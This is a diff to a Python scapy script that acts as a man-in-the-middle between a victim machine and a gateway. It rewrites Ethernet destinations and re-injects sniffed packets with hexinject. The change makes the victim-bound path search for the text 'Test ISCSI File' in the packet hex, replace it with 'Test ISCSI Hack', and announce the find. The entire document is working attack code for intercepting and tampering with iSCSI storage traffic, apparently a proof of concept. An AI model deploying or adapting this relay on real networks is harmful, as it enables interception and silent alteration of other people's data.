@@ -60,9 +60,17 @@ def handle_packet(packet):
         packet[Ether].dst = GATEWAY_MAC
         #if(packet[IP].proto == "tcp"):
         packet_hex = parse_to_hex(packet)
-        print packet_hex
+        print packet_hex + "----"
+        os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
+    elif (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
+        # we change the packet destination to the initiator machine
+        packet[Ether].dst = VICTIM_MAC
+        #if(packet[IP].proto == "tcp"):
+        packet_hex = parse_to_hex(packet)
+        print packet_hex + "----"
         if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
             packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
+            print "\n\n\nFOUND THE FILE CONTENT!\n\n\n"
             #packet_file = open('packet', 'w')
             #packet_file.write(packet_read)
             os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
@@ -70,11 +78,4 @@ def handle_packet(packet):
             #print "hex injected"
             os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
             #print "A tcp packet from " + packet[IP].src + " redirected!"
-    elif (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
-        # we change the packet destination to the initiator machine
-        packet[Ether].dst = VICTIM_MAC
-        #if(packet[IP].proto == "tcp"):
-        packet_hex = parse_to_hex(packet)
-        print packet_hex
-        os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
 sniff(prn=handle_packet, filter=filter, iface=iface, count=0)
